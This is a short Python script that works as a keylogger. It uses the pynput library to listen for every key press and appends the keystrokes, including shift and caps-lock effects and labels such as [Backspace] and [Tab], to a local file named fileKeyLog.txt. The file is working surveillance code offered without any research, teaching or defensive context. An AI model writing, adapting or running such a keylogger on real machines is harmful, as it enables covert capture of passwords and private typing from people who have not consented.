import os
import sys
import time
from pynput import keyboard

path = 'fileKeyLog.txt'
shift = False
caps = False

def on_press(key):
    global shift, caps
    try:
        with open(path, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                f.write('[Backspace]')
            elif key == keyboard.Key.tab:
                f.write('[Tab]')
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                shift = True
            elif key == keyboard.Key.caps_lock:
                caps = not caps
            else:
                k = str(key).replace("'", "")
                if k.startswith('Key'):
                    f.write(f'[{k[4:]}]')
                else:
                    if shift and caps:
                        f.write(k.lower())
                    elif shift or caps:
                        f.write(k.upper())
                    else:
                        f.write(k)
    except AttributeError:
        pass

def on_release(key):
    global shift
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift = False

def startKLog():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    startKLog()
